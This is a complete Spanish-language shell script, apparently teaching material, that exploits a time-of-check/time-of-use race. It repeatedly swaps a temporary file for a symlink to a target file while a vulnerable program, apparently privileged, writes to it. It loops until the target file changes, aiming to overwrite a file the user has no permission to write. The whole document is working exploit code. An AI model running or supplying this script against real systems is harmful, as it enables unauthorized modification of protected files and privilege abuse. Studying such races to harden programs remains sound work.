#!/bin/sh
# script-de-explotacion.sh

# Si el usuario no pasa parametros, doy el modo de uso
if [ $# -lt 2 ] 
then
	echo "Uso: $0 NOMBRE_PRG_VULNERABLE NOMBRE_ARCHIVO_A_SOBRESCRIBIR"
	exit 0
fi

NOMBRE_PRG_VULNERABLE="$1";
NOMBRE_ARCHIVO="$2";

# Genero un nombre aleatorio para el archivo que puede escribir el usuairo
NOMBRE_ARCHIVO_TMP=`mktemp explotacion-temp.XXXXXXXXXXXXXXXX`;

# Forzamos entrar en el while la primera vez (tipo do .. while)
infoArchivoViejo=`ls -l $NOMBRE_ARCHIVO`;
infoArchivoNuevo=`ls -l $NOMBRE_ARCHIVO`;

# Mientras el archivo no cambie, reintento
while [ "$infoArchivoViejo" = "$infoArchivoNuevo" ]
do 
	# Borro el archivo del ensayo de explotación anterior
	rm -f $NOMBRE_ARCHIVO_TMP 2> /dev/null

	# Sobrescribo el archivo al cual el usuario SI tiene acceso
	echo "Sobrescribo con este mismo texto el archivo al cual el usuario tiene permisos" > $NOMBRE_ARCHIVO_TMP
	
	# Corro en background el programa vulnerable
	./$NOMBRE_PRG_VULNERABLE $NOMBRE_ARCHIVO_TMP &
	
	# Corro en el background borrar el link
	unlink $NOMBRE_ARCHIVO_TMP 2>/dev/null 
	
	# y volver a crearlo (a ver si se produce la condición de carrera
	ln -s $NOMBRE_ARCHIVO $NOMBRE_ARCHIVO_TMP 2> /dev/null
	
	# Actualizo la informacion de creacion de los archivos, a ver si apunto al mismo o no
	infoArchivoNuevo=`ls -l $NOMBRE_ARCHIVO`
done

rm $NOMBRE_ARCHIVO_TMP

echo "Se modificó el archivo $NOMBRE_ARCHIVO";

exit 0
